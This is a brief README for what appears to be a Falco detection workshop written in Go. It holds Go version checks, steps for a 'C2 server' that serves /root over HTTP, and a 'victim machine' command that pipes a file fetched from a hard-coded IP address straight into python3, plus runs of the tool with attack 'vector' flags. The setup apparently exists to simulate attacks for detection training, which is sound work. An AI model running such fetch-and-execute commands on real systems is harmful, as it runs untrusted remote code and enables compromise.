# README


Remember: 

    Adjust de go versions.

    go version

    Validate the project versions

    go list -m -versions github.com/diego-all/falco-workshop


In C2 Server execute:


    cd /root

    python3 -m http.server 80



In victim machine execute:


    curl -sL http://34.27.180.215/sitio/vuelta.txt | python3


    go run github.com/diego-all/falco-workshop@latest init --vector A
    go run main.go init --vector A

    go run github.com/diego-all/falco-workshop@v0.1.1 init --vector A

    go run github.com/diego-all/falco-workshop@latest init --interactive
    go run main.go init --interactive
    


